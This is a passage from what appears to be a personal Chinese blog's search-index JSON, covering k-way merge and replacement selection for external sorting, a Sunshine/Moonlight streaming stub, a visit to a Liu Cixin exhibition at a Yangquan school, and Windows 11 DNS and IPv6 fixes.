M)</li> <li>\u6bcf\u4e00\u4e2a\u78c1\u76d8\u603b\u662f\u8db3\u591f\u5927\u7684\uff0c\u80fd\u591f\u5bb9\u7eb3 M \u4e2a\u6570\u636e</li> </ul> <p>Info</p> <p>We call each set of sorted records a run .</p> <p>\u6211\u4eec\u628a\u6bcf\u4e00\u5c0f\u6bb5\u6392\u5e8f\u597d\u7684\u6570\u636e\u79f0\u4e3a \u987a\u4e32 \u3002</p> <p>Attention</p> <p>\u4e00\u822c\u800c\u8a00\uff0c\u6587\u4ef6\u8bfb\u5199\u672c\u8eab\u82b1\u8d39\u7684\u65f6\u95f4\u8fdc\u957f\u4e8e\u6392\u5e8f\u7528\u65f6\uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u5c3d\u91cf\u51cf\u5c11\u8bfb\u5199\u6b21\u6570\uff08\u4e5f\u53eb\u8d9f\u6570 (passes)\uff09\uff0c\u6240\u4ee5\u5c3d\u91cf\u5c06\u5185\u5b58\u8bfb\u6ee1\uff0c\u987a\u4e32\u4e00\u822c\u6570\u636e\u91cf\u4e3aM</p>","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#k-way-merge-with-2k-tapes","title":"k-way merge with  2*k tapes","text":"<p>\u6211\u4eec\u5c06 2*k \u4e2a\u78c1\u5e26\u5206\u4e3a k \u4e2a\u8f93\u5165\u78c1\u5e26\u548c k \u4e2a\u8f93\u51fa\u78c1\u5e26</p> <ol> <li>\u6211\u4eec\u5c06\u603b\u6570\u636e N \u4f9d\u6b21\u53d6 M \u4e2a\u8f93\u5165\u5185\u5b58\u83b7\u5f97 \\(\\frac{N}{M}\\) \uff08\u5411\u4e0a\u53d6\u6574\uff0c\u4e0d\u6ee1 M \u9879\u7684\u987a\u4e32\u6309 M \u9879\u8bb0\uff09\u4e2a\u957f\u4e3a M \u7684\u987a\u4e32\uff0c\u5c06\u987a\u4e32\u8f6e\u6d41\u8f93\u5165 k \u4e2a\u8f93\u5165\u78c1\u5e26\u4e0a</li> <li>\u4f7f\u7528\u4f18\u5148\u961f\u5217\u53d6 k \u4e2a\u8f93\u5165\u78c1\u5e26\u6700\u524d\u7aef\u9879\u4e2d\u7684\u6700\u5c0f\u9879\u8fdb\u884c\u5408\u5e76k \u4e2a\u987a\u4e32\uff08\u7c7b\u4f3c\u5408\u5e76\u6392\u5e8f\uff09\uff0c\u83b7\u5f97\u957f\u4e3a k*M \u7684\u987a\u4e32\u8f6e\u6d41\u8f93\u5165 k \u4e2a\u8f93\u51fa\u78c1\u5e26\u4e0a</li> <li>\u89d2\u8272\u4ea4\u6362\uff0c\u8f93\u5165\u78c1\u5e26\u770b\u4f5c\u8f93\u51fa\u78c1\u5e26\uff0c\u8f93\u51fa\u78c1\u5e26\u770b\u4f5c\u8f93\u5165\u78c1\u5e26\uff0c\u91cd\u590d\u6b65\u9aa4 2</li> <li>\u5f53\u987a\u4e32\u957f\u5ea6\u53d8\u4e3a N \u65f6\u7ed3\u675f\u3002 </li> </ol> <p>Note</p> <p>\u4e0d\u96be\u63a8\u65ad\uff0ck-way merge \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O\\left( \\log_{k}\\left( \\frac{N}{M} \\right) \\right)\\)</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u56fe\u89e3\uff1a</p>","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#2-way-merge","title":"2-way merge","text":"","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#3-way-merge","title":"3-way merge","text":"","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#k-way-merge-with-k1-tapes","title":"k-way merge with k+1 tapes","text":"<p>Question</p> <p>\u4f7f\u7528 2*k \u4e2a\u78c1\u5e26\u56fa\u7136\u53ef\u884c\uff0c\u4f46\u662f\u4e0d\u96be\u53d1\u73b0\u4e0d\u5c11\u78c1\u5e26\u5728\u540e\u9762\u7684\u65f6\u5019\u4f7f\u7528\u5f88\u5c11\uff0c\u6211\u4eec\u80fd\u5426\u60f3\u529e\u6cd5\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u78c1\u5e26\u4f7f\u7528\uff1f</p> <ol> <li>\u5047\u60f3\u6211\u4eec\u5c06\u603b\u6570\u636e\u7684\u987a\u4e32\u5206\u7ed9 k \u4e2a\u78c1\u5e26\u7684\u65f6\u5019\u5e76\u4e0d\u592a\u5747\u5300\uff0c\u603b\u662f\u80fd\u627e\u5230\u4e00\u4e2a\u78c1\u5e26\uff08\u8bb0\u4e3a \\(T_{1}\\)\uff09\u5206\u5f97\u987a\u4e32\u91cf\uff08\u8bbe\u4e3a \\(k_1\\)\uff09\u6700\u5c11</li> <li>\u5728\u8fdb\u884c \\(k_1\\) \u6b21 Merge_k \u8f93\u5165\u5269\u4f59\u7684\u4e00\u4e2a\u7a7a\u78c1\u5e26\uff08\u8bb0\u4e3a \\(T_{k+1}\\)\uff09\u540e\uff0c\u8fd9\u4e2a\u78c1\u5e26\u4e00\u5b9a\u4e3a\u7a7a\uff0c\u800c \\(T_{k+1}\\) \u4e0a\u6709 \\(k_{1}\\) \u4e2a\u957f\u4e3a \\(kM\\) \u7684\u987a\u4e32</li> <li>\u6211\u4eec\u5c06 \\(T_{1}\\) \u770b\u4f5c\u7a7a\u78c1\u5e26\uff0c\\(T_{k+1}\\) \u770b\u4f5c\u5305\u542b \\(k*k_{1}\\) \u4e2a\u957f\u4e3a M \u7684\u987a\u4e32\uff0c\u91cd\u590d\u6b65\u9aa4 2\uff0c\u76f4\u5230\u6240\u6709\u987a\u4e32\u5728\u4e00\u4e2a\u78c1\u5e26\u4e0a</li> </ol> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50</p>","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#2-way-merge_1","title":"2-way merge","text":"","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#fibonacci-sequence-of-order-k","title":"Fibonacci sequence of order K","text":"<p>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5982\u679c\u5c06 34 \u4e2a\u987a\u4e32 5\u300129 \u5206\u7ed9\u4e24\u4e2a\u78c1\u76d8\uff0c\u4e0d\u96be\u9000\u51fa\u5982\u4e0b\u5408\u5e76\u8fc7\u7a0b</p> <p></p> <p>\u5355\u770b\u5408\u5e76\u6b21\u6570 pass \\(7-&gt;12\\)  \uff0c\u6211\u4eec\u51e0\u4e4e\u53ef\u4ee5\u8ba4\u4e3a\u7528\u65f6\u7ffb\u500d\uff0c\u8fd9\u662f\u4e0d\u80fd\u5bb9\u5fcd\u7684</p> <p>Question</p> <p>\u600e\u6837\u7684\u5206\u914d\u624d\u7b97\u5408\u7406\uff1f</p> <p>Info</p> <p>Fibonacci sequence of order K\uff08K \u9636\u7ea7\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff09</p> <p>\u6211\u4eec\u8ba4\u4e3a\u7b26\u5408\u4e0b\u9762\u516c\u5f0f\u7684\u6570\u5217\u79f0\u4e3a K \u9636\u7ea7\u6590\u6ce2\u90a3\u5951\u6570\u5217</p> \\[F^{(k)}(N)=\\begin{cases}0\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad0\\leq N\\leq k-2\\\\1\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad N=k-1 \\\\F^{k}(N-1)+\\dots+F^{k}(N-k)\\quad\\quad N\\geq k\\end{cases}\\] <p>\u800c\u5f53\u6211\u4eec\u5728\u8fdb\u884c k-way merge \u65f6\u6309\u7167 k \u9636\u6590\u6ce2\u90a3\u5951\u6570\u5217\u5206\u914d\u65f6\u5408\u5e76\u6b21\u6570\u6700\u5c11\u3002</p> <p>\u4f8b\u5982\uff1a\u5bf9\u4e8e 3 \u9636\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff1a0, 0, 1, 1, 2, 4, 7, 13, 24, 44...</p> <p>\u5982\u679c\u6211\u4eec\u8981\u5c06 3 \u5206\u5230\u4e09\u4e2a\u78c1\u76d8\u4e0a\uff0c\u6211\u4eec\u8fd9\u6837\u8003\u8651\uff1a\u5bfb\u627e\u4e00\u6bb5\u8fde\u7eed\u7684\u6590\u6ce2\u90a3\u5951\u6570 a,b,c,d \uff0c\u6ee1\u8db3\uff1atotal = c+(b+c)+(a+b+c) = b+2c+d\u3002\u5bf9\u4e8e 31\uff0c\u4e0d\u96be\u5f97\u5230\u5e94\u8be5\u4e3a 2,4,7,13\uff0c\u6545\u5206\u4e3a 7,11,13 \u3002</p>","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#replacement-selection","title":"Replacement selection","text":"<p>Question</p> <p>\u6839\u636e\u4e0a\u9762\u6211\u4eec\u83b7\u53d6\u987a\u4e32\u7684\u65b9\u5f0f\uff0c\u987a\u4e32\u957f\u5ea6\u4e0d\u8d85\u8fc7 M\uff0c\u4e5f\u5c31\u5bfc\u81f4\u987a\u4e32\u6570\u91cf\u4e0d\u5c11\u4e8e \\(\\frac{N}{M}+1\\) \u4e2a\uff1b\u800c\u6211\u4eec\u53d1\u73b0\u8d9f\u6570 (passes) \u4e0e\u987a\u4e32\u6570\u6210\u6b63\u76f8\u5173\uff0c\u80fd\u4e0d\u80fd\u51cf\u5c11\u987a\u4e32\u6570\u5462\uff1f</p> <p>\u6211\u4eec\u8003\u8651\u4e00\u4e2a\u66f4\u597d\u5730\u6784\u5efa\u987a\u4e32\u7684\u529e\u6cd5\u2014\u2014\u66ff\u6362\u9009\u62e9(Replacement selection)</p> <ol> <li>\u5c06\u8f93\u5165\u78c1\u76d8\u524d M \u4e2a\u6570\u636e\u8f93\u5165\u5185\u5b58\uff08\u5185\u5b58\u4e2d\u4f9d\u65e7\u4f7f\u7528\u4f18\u5148\u961f\u5217\u6392\u5e8f\uff09</li> <li>\u6267\u884c DeleteMin \u64cd\u4f5c\u5c06\u6700\u5c0f\u503c x \u8f93\u5165\u8f93\u51fa\u78c1\u76d8\u4e2d</li> <li>\u4ece\u8f93\u5165\u78c1\u76d8\u518d\u8bfb\u53d6\u4e00\u4e2a\u6570\u636e y\uff0c\u5982\u679c y &gt;= x\uff0c\u5219 y \u653e\u5165\u5185\u5b58\u5e76\u4e0a\u6ee4\uff0c\u91cd\u590d\u6b65\u9aa4 2\uff1b\u5982\u679c y &lt; x\uff0c\u5219\u5c06 y \u653e\u5165\u4f18\u5148\u961f\u5217\u7684\u6b7b\u533a(dead space)\u5e76\u8ba4\u4e3a\u4f18\u5148\u961f\u5217\u5927\u5c0f\u51cf 1\uff0cy \u53c2\u52a0\u4e0b\u4e00\u4e2a\u987a\u4e32\u7684\u6784\u5efa</li> <li>\u5982\u679c\u4f18\u5148\u961f\u5217\u51cf\u5c0f\u4e3a 0 (End of Run) \u6216\u8005\u662f\u8f93\u5165\u78c1\u76d8\u5df2\u7ecf\u4e3a\u7a7a (end of tape) \u65f6\uff0c\u5c06\u6b7b\u533a\u4e2d\u7684\u6240\u6709\u5143\u7d20\u6392\u5e8f\u540e\u4f5c\u4e3a\u4e00\u4e2a\u987a\u4e32\u8f93\u51fa (Rebuild Heap) \uff1b\u91cd\u590d\u6b65\u9aa4 1</li> </ol> <p>\u4e0d\u96be\u63a8\u65ad\uff0c\u8fd9\u6837\u6784\u5efa\u7684\u987a\u4e32\u957f\u5ea6\u81f3\u5c11\u4e3a M\uff0c\u4ece\u800c\u8fbe\u5230\u4e86\u51cf\u5c11\u987a\u4e32\u6570\u91cf\u7684\u76ee\u7684</p> <p>Note</p> <p>\u5f53\u8f93\u5165\u78c1\u76d8\u6570\u636e\u8db3\u591f\u5927\u4e14\u968f\u673a\u65f6\uff0c\u83b7\u5f97\u7684\u987a\u4e32\u5e73\u5747\u957f\u5ea6\u7ea6\u4e3a 2M</p> <p>\u4e0b\u9762\u662f M=3 \u65f6\u7684\u4e00\u4e2a\u56fe\u793a</p> <p></p>","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#huffman-tree-in-merge","title":"Huffman Tree in merge","text":"","tags":["blog","algo"]},{"location":"2024/03/23/k-way-merge-algorithm/#_1","title":"\u53c2\u8003\u6587\u6863","text":"<ul> <li>k-way merge algorithm</li> <li>Data structures and algorithm analysis in C (P 251-254)<ul> <li>\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790 C \u8bed\u8a00\u63cf\u8ff0\uff08\u82f1\u6587\u7248\u00b7\u7b2c2\u7248\uff09 (Mark Allen Weiss)</li> </ul> </li> <li>ZJU ADS slider </li> </ul>","tags":["blog","algo"]},{"location":"2025/02/15/%E4%BD%BF%E7%94%A8sunshinemoonlight%E4%B8%B2%E6%B5%81-%E8%BF%9C%E6%8E%A7-%E5%89%AF%E5%B1%8F/","title":"\u4f7f\u7528Sunshine+Moonlight\u4e32\u6d41 \u8fdc\u63a7 \u526f\u5c4f","text":"<p>Sunshine \u548c Moonlight \u662f\u4e00\u5bf9\u7528\u4e8e\u6e38\u620f\u6d41\u5f0f\u4f20\u8f93\u7684\u5f00\u6e90\u8f6f\u4ef6\uff0c\u65e8\u5728\u4e3a\u7528\u6237\u63d0\u4f9b\u9ad8\u8d28\u91cf\u3001\u4f4e\u5ef6\u8fdf\u7684\u6e38\u620f\u4f53\u9a8c\u3002\u5b83\u4eec\u7684\u5de5\u4f5c\u539f\u7406\u662f\u5c06\u6e38\u620f\u4ece\u4e00\u53f0\u4e3b\u673a\u4f20\u8f93\u5230\u53e6\u4e00\u53f0\u8bbe\u5907\u4e0a\uff0c\u80fd\u5728\u5c40\u57df\u7f51\u6216\u4e92\u8054\u7f51\u4e2d\u8fdb\u884c\u6e38\u620f\u6d41\u5f0f\u64ad\u653e\u3002</p>","tags":["blog","tool"]},{"location":"2025/02/15/%E4%BD%BF%E7%94%A8sunshinemoonlight%E4%B8%B2%E6%B5%81-%E8%BF%9C%E6%8E%A7-%E5%89%AF%E5%B1%8F/#_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>https://blog.csdn.net/weixin_46065314/article/details/136428076</li> <li>https://github.com/loki-47-6F-64/sunshine/issues/59issuecomment-1709018824</li> <li>https://github.com/nomi-san/parsec-vdd</li> <li>https://github.com/moonlight-stream/moonlight-docs/wiki/Setup-Guide</li> </ul>","tags":["blog","tool"]},{"location":"2024/07/28/%E5%B1%B1%E8%A5%BF%E9%98%B3%E6%B3%89-%E7%9F%BF%E5%8C%BA%E8%B5%9B%E9%B1%BC%E5%B0%8F%E5%AD%A6-%E5%88%98%E6%85%88%E6%AC%A3%E5%B1%95%E8%A7%88%E9%A6%86%E7%A7%91%E5%AD%A6%E5%AE%AB/","title":"\u5c71\u897f\u9633\u6cc9 \u77ff\u533a\u8d5b\u9c7c\u5c0f\u5b66 \u5218\u6148\u6b23\u5c55\u89c8\u9986&\u79d1\u5b66\u5bab","text":"<p>\u76f4\u5230\u4eca\u5929\uff0c\u6211\u624d\u77e5\u9053\u5218\u6148\u6b23\u5148\u751f\u5728\u5c71\u897f\u9633\u6cc9\u957f\u5927 \uff1b\u800c\u5728\u5c71\u897f\u9633\u6cc9\u7684\u77ff\u533a\u8d5b\u9c7c\u5c0f\u5b66 \u5efa\u6709\u4e00\u4e2a\u5218\u6148\u6b23\u5c55\u89c8\u9986\uff0c\u652f\u6559\u4e4b\u4f59\uff0c\u6211\u4eec\u6210\u529f\u7533\u8bf7\u8fdb\u5165\u53c2\u89c2\u3002</p> <p>\u9996\u5148\u89e3\u91ca\u4e00\u4e0b\u6b64\u201c\u77ff\u533a\u201d\u975e\u5f7c\u201c\u77ff\u533a\u201d\uff0c\u9633\u6cc9\u5e02\u6709\u4e00\u5757\u533a\u57df\u53eb\u201c\u57ce\u533a\u201d\uff0c\u4e00\u5757\u53eb\u201c\u77ff\u533a\u201d\uff08\u5f53\u7136\u8fd8\u6709\u5176\u5b83\u7684\uff0c\u6bd4\u5982\u201c\u90ca\u533a\u201d\u2026\u2026\uff0c\u53ef\u80fd\u662f\u5386\u53f2\u9057\u7559\u95ee\u9898\uff09\uff0c\u4f46\u662f\u90fd\u662f\u6709\u697c\u6709\u8def\u7684\u5c45\u6c11\u533a \ud83d\ude02\u3002</p> <p>mkdocs \u539f\u751f\u4f3c\u4e4e\u662f\u4e0d\u652f\u6301 gif/mp4 \u672c\u5730\u5d4c\u5165\u7684\uff0c\u597d\u50cf\u6709\u63d2\u4ef6\u80fd\u641e\uff0c\u4f46\u662f\u6709\u70b9\u9ebb\u70e6\uff0c\u7b97\u4e86\u3002</p>","tags":["blog"]},{"location":"2024/07/28/%E5%B1%B1%E8%A5%BF%E9%98%B3%E6%B3%89-%E7%9F%BF%E5%8C%BA%E8%B5%9B%E9%B1%BC%E5%B0%8F%E5%AD%A6-%E5%88%98%E6%85%88%E6%AC%A3%E5%B1%95%E8%A7%88%E9%A6%86%E7%A7%91%E5%AD%A6%E5%AE%AB/#_1","title":"\u5218\u6148\u6b23\u5c55\u89c8\u9986","text":"<p>\u8d5b\u9c7c\u5c0f\u5b66\u662f\u5218\u6148\u6b23\u5148\u751f\u7684\u6bcd\u6821\uff0c\u800c\u5176\u4e2d\u6709\u4e00\u4e2a\u5218\u6148\u6b23\u5c55\u89c8\u9986\u3002</p> <p></p> <p>\u5f53\u7136\uff0c\u8bf4\u662f\u5c55\u89c8\u9986\uff0c\u4f46\u6bd5\u7adf\u662f\u5c0f\u5b66\u4e2d\uff0c\u4e3b\u4f53\u53ea\u662f\u4e00\u4e2a\u5c0f\u623f\u95f4\u3002</p> <p>\u8fd9\u91cc\u6709\u5404\u79cd\u5404\u6837\u7684\u300a\u4e09\u4f53\u300b\u300a\u6d41\u6d6a\u5730\u7403\u300b\uff1a</p> <p></p> <p></p> <p></p> <p>\u867d\u7136\u77e5\u9053\u6bcf\u6b21\u89c1\u5230\u7684\u300a\u4e09\u4f53\u300b/\u300a\u6d41\u6d6a\u5730\u7403\u300b\u90fd\u611f\u89c9\u4e0d\u540c\uff0c\u4e5f\u77e5\u9053\u5176\u7545\u9500\u6d77\u5916\uff0c\u4f46\u4e00\u6b21\u6027\u770b\u89c1\u5982\u6b64\u4e4b\u591a\u7684\u7248\u672c\u8fd8\u662f\u6709\u6240\u9707\u64bc\u7684\u3002</p> <p>\u5f53\u7136\u8fd8\u6709\u5218\u6148\u6b23\u5148\u751f\u7684\u5176\u4ed6\u8457\u4f5c\uff0c\u7167\u7247\u591a\u800c\u6742\uff0c\u5c31\u4e0d\u653e\u51fa\u6765\u4e86\uff1b\u5176\u4ed6\u7684\u66f4\u591a\u662f\u5218\u5148\u751f\u5728\u8d5b\u9c7c\u5c0f\u5b66\u2026\u2026\u7559\u4e0b\u7684\u75d5\u8ff9<sup>1</sup>\uff1f</p>","tags":["blog"]},{"location":"2024/07/28/%E5%B1%B1%E8%A5%BF%E9%98%B3%E6%B3%89-%E7%9F%BF%E5%8C%BA%E8%B5%9B%E9%B1%BC%E5%B0%8F%E5%AD%A6-%E5%88%98%E6%85%88%E6%AC%A3%E5%B1%95%E8%A7%88%E9%A6%86%E7%A7%91%E5%AD%A6%E5%AE%AB/#_2","title":"\u79d1\u5b66\u5bab","text":"<p>\u5982\u679c\u8bf4\u5218\u6148\u6b23\u5c55\u89c8\u9986\u8fd8\u5728\u6211\u7684\u610f\u6599\u4e4b\u4e2d\uff0c\u90a3\u4e48\u8d5b\u9c7c\u5c0f\u5b66\u5185\u7684\u79d1\u5b66\u5bab\u5219\u662f\u8ba9\u6211\u4eec\u5927\u5403\u4e00\u60ca\u3002</p> <p>\u659c\u5c4b\uff0c\u5927\u81f4\u5c31\u662f\u4e00\u4e2a\u5730\u677f\u503e\u659c\uff0c\u800c\u5185\u90e8\u88c5\u4fee\u5411\u53cd\u65b9\u5411\u503e\u659c\u7684\u4e00\u4e2a\u5c0f\u5c4b\u3002\u4e00\u4e2a\u6bd4\u8f83\u7ecf\u5178\u7684\u5b9e\u9a8c\u5c31\u662f\u6eda\u7b52\u5411\u4e0a\u6eda\u52a8\uff0c\u4e0b\u9762\u662f\u6211\u4eec\u5728\u91cc\u9762\u62cd\u6444\u7684\u60c5\u51b5\uff1a</p> <p>gif</p> <p>\u4e0d\u8fc7\u5b9e\u8bdd\u8bf4\uff0c\u659c\u5c4b\u5229\u7528\u773c\u775b\u6b3a\u9a97\u5927\u8111\uff0c\u5728\u91cc\u9762\u5f85\u4e45\u4e86\u53ef\u80fd\u611f\u89c9\u4e0d\u9002\u3002</p> <p>\u4e0b\u9762 \u8fd9\u4e2a \u539f\u8c05\u6211\u9664\u4e86\u201c\u5c16\u7aef\u653e\u7535\u201d\u60f3\u4e0d\u5230\u5176\u5b83\u7684\u76f8\u5173\u8bcd\u6c47\u4e86\uff1a</p> <p>\u7535\u6d41\u4f1a\u4ea7\u751f\u70ed\u91cf\uff0c\u7a0d\u5fae\u653e\u4e45\u4e00\u70b9\u662f\u4f1a\u70eb\u7684\uff08\u4e0d\u7136\u6211\u4eec\u653e\u624b\u53c8\u62ac\u624b\u662f\u5728\u5e72\u4ec0\u4e48\ud83d\ude07\uff09\u3002</p> <p>\u6050\u6016\u7684\u662f\uff0c\u5c45\u7136\u8fd8\u6709\u5730\u9707\u5c4b\u3002\u8fd9\u91cc\u4e0d\u662f\u4ec0\u4e48\u5ba3\u8bb2\u5730\u9707\u77e5\u8bc6\u7684\u623f\u95f4\uff1b\u800c\u662f\u4e00\u4e2a\u6a21\u62df\u623f\u95f4\uff01\u623f\u95f4\u6709\u6a2a\u6ce2\u548c\u7eb5\u6ce2\u6a21\u5f0f\uff0c\u9707\u7ea7\u53ef\u8c03\uff1b\u6211\u4eec\u5c1d\u8bd5\u4e86\u4e0b 7 \u7ea7\uff08\u5e94\u8be5\uff09\uff0c\u6293\u7740\u680f\u6746\u8111\u6d46\u6447\u5300\u4e86\uff08\u4e0d\u6293\u4f30\u8ba1\u5df2\u7ecf\u5728\u5730\u4e0a\u4e86\uff09\uff0c\u6050\u6016\u3002\u5176\u5b9e\u540e\u9762\u8fd8\u6709\u6a21\u62df\u706b\u5c71\u55b7\u53d1\u7684\u9707\u52a8\uff0c\u53ef\u60dc\u5f53\u65f6\u6765\u7684\u6bd4\u8f83\u7a81\u7136\uff0c\u6ca1\u6765\u5f97\u53ca\u7559\u5f71\u3002</p> <p>\u6700\u540e\u4e00\u90e8\u5206\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\u4e00\u4e9b\u9057\u7559\u88c5\u7f6e\uff0c\u6bd4\u5982\u8fd9\u4e2a\u65e9\u671f\u8b66\u62a5\u5668<sup>2</sup>\uff1f</p> <p>\u8b66\u62a5\u4ec0\u4e48\uff1f\u8fd9\u4e2a\uff1a\uff08\u5e94\u8be5\u662f\u5df2\u7ecf\u53bb\u9664\u4e86\u706b\u836f\u7684/\u6216\u8005\u53ea\u662f\u7eba\u7ec7\u54c1\uff09</p> <p></p> <p>\u6700\u540e\u79bb\u5f00\u65f6\u624d\u53d1\u73b0\u95e8\u53e3\u90a3\u719f\u6089\u53c8\u964c\u751f\u7684\u201c\u73ed\u724c\u201d\uff1a</p> <p></p> <p>\u539f\u6765\u5c0f\u5b66\u6bd5\u4e1a\u5df2\u7ecf 7 \u5e74\u8fc7\u53bb\u4e86\u3002</p> <ol> <li> <p>\u592a\u4e45\u6ca1\u5199\u4f5c\u4e86\uff0c\u7b14\u58a8\u751a\u5c11\u2026\u2026\u00a0\u21a9</p> </li> <li> <p>\u4e0d\u592a\u786e\u5b9a\uff0c\u8bb2\u89e3\u5458\u8bb2\u89e3\u65f6\u6ca1\u592a\u542c\u6e05\u00a0\u21a9</p> </li> </ol>","tags":["blog"]},{"location":"2025/01/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%B0%8F%E9%97%AE%E9%A2%98/","title":"\u7f51\u7edc\u76f8\u5173\u5c0f\u95ee\u9898","text":"<p>\u8bb0\u5f55\u4e00\u4e9b\uff08windows11\uff09\u5728\u7f51\u7edc\u4e0a\u51fa\u73b0\u8fc7\u7684\u95ee\u9898\u3002</p>","tags":["blog","web"]},{"location":"2025/01/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%B0%8F%E9%97%AE%E9%A2%98/#dns","title":"DNS \u670d\u52a1\u5668\u672a\u54cd\u5e94","text":"<p>\u5728\u6302\u7740\u4ee3\u7406\u5173\u673a\u540e\u5f00\u673a\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a</p> <ul> <li>wifi \u8fde\u63a5\u4f46\u662f\u8bbf\u95ee\u7f51\u7ad9\u4e0d\u53ef\u884c\uff0c\u7535\u8111\u81ea\u67e5\u53d1\u73b0\u201cDNS \u670d\u52a1\u5668\u672a\u54cd\u5e94\u201d\uff08\u731c\u6d4b\u4ee3\u7406\u5bfc\u81f4\uff09</li> </ul> <p>\u53ef\u80fd\u662f\u56e0\u4e3a\u4f7f\u7528\u4e86\u201ccloudflare\u201d\u8fd9\u4e2a\u4ee3\u7406 VPN\uff0c\u800c\u5728\u4e0a\u4e00\u6b21\u4f7f\u7528\u540e\u76f4\u63a5\u5173\u673a\u800c\u672a\u5173\u95ed\u4ee3\u7406\uff0c\u5bfc\u81f4\u4e86\u4e00\u4e9b\u672a\u540d\u9519\u8bef\uff0c\u7f51\u4e0a\u627e\u7684\u4ec0\u4e48\u5237\u65b0 DNS \u7f13\u5b58\u4e4b\u7c7b\u90fd\u8fdb\u884c\u4e86\u5c1d\u8bd5\u4f46\u65e0\u6548\uff0c\u4e0b\u9762\u662f\u5176\u4e2d\u6211\u5c1d\u8bd5\u6709\u6548\u7684\u65b9\u6cd5\uff1a</p> <ol> <li> <p>\u6253\u5f00\u7cfb\u7edf\u8bbe\u7f6e\uff0c\u8fdb\u5165 \u7f51\u7edc\u548c Internet&gt;WLAN \uff0c\u8fdb\u5165 \u786c\u4ef6\u5c5e\u6027 </p> </li> <li> <p>\u70b9\u51fb\u201cDNS \u670d\u52a1\u5668\u5206\u914d\u201d\u53f3\u4fa7\u7684 \u7f16\u8f91 \uff0c\u5c06\u5176\u6539\u4e3a\u81ea\u52a8\uff08\u4f30\u8ba1\u662f\u4f7f\u7528\u4ee3\u7406\u65f6\u88ab\u8c03\u4e3a\u624b\u52a8\uff0c\u800c\u624b\u52a8\u51fa\u4e86\u95ee\u9898\uff09\uff0c\u70b9\u51fb\u4fdd\u5b58</p> </li> <li> <p>\u5728\u8bbe\u7f6e\u7684\u5de6\u4e0a\u89d2\u51fa\u67e5\u627e\u201c\u7f51\u7edc\u91cd\u7f6e\u201d\uff0c\u8fdb\u53bb\u91cd\u7f6e     </p> </li> <li> <p>\u7b49\u5f85\u91cd\u542f\u6216\u624b\u52a8\u91cd\u542f\u7535\u8111</p> </li> <li>\u5982\u672a\u89e3\u51b3\u53ef\u4ee5\u518d\u81ea\u884c\u641c\u7d22\u5176\u4ed6\u65b9\u6cd5</li> <li>\u9700\u8981\u7684\u8bdd\u91cd\u65b0\u914d\u7f6e\u4ee3\u7406\uff0c\u914d\u7f6e\u597d\u540e\u518d\u53bb\u770b DNS \u670d\u52a1\u5668\u914d\u7f6e\uff0c\u679c\u7136\u53d8\u4e3a\u4e86\u624b\u52a8\uff0c\u800c\u5f53\u6211\u4eec\u5173\u95ed\u4ee3\u7406\u540e\u5e94\u5f53\u662f\u53d8\u56de\u81ea\u52a8\u7684\u3002     </li> </ol> <p>Tip</p> <p>\u611f\u89c9\u8fd8\u662f\u4e0d\u80fd\u7528\u8fd9\u79cd\u4f1a\u6539\u53d8\u7f51\u7edc\u8bbe\u7f6e\u7684\u8f6f\u4ef6\uff0c\u540e\u6765\u6539\u7528\u4e86 Clash Verge \u3002</p>","tags":["blog","web"]},{"location":"2025/01/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%B0%8F%E9%97%AE%E9%A2%98/#where-is-my-ipv6","title":"Where is my ipv6","text":"<p>\u4e4b\u524d\u5728 memset 0 \u63a8\u8350\u4e0b\u4f7f\u7528 sunshine+moonlight \u4e32\u6d41\uff0c\u5728\u6821\u56ed\u7f51\uff08\u5c40\u57df\u7f51\uff09\u7684\u52a0\u6210\u4e0b\u4f7f\u7528\u5e73\u677f\u8fdc\u7a0b\u63a7\u5236\u7535\u8111\uff0c\u671f\u95f4\u5229\u7528\u5230 ipv6 \u8ba9\u5e73\u677f\u8bbf\u95ee\u5230\u7535\u8111\uff0c\u4f46\u6700\u8fd1\u5728 cmd \u4e2d\u952e\u5165 <code>ipconfig</code> \u53d1\u73b0 ipv6 \u672a\u663e\u793a\u3002</p> <p>\u641c\u4e86\u534a\u5929\uff0c\u5728\u672c\u6b21\u53ef\u884c\u7684\u65b9\u6cd5\uff1a\u63a7\u5236\u9762\u677f\u8fdb <code>\u7f51\u7edc\u548c Internet</code> \uff0c\u5982\u4e0b</p> <p></p> <p>\u5728\u5f39\u51fa\u7684 WLAN \u72b6\u6001\u4e2d\u70b9\u51fb\u5c5e\u6027 \uff0c\u5982\u4e0b\u56fe\u5c06 <code>Internet \u534f\u8bae\u7248\u672c6(TCP?IPv6)</code> \u52fe\u9009\u540e\u9010\u6b65\u9000\u51fa\u5373\u53ef\u3002</p> <p></p> <ul> <li>https://blog.csdn.net/superjunenaruto/article/details/112007151</li> </ul>","tags":["blog","web"]},{"location":"summary/","title":"Summary","text":"<p>\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9b\u81ea\u5df1\u53ef\u80fd\u6709\u7528\u7684\u7ecf\u9a8c\u8d34\u3002</p> summary          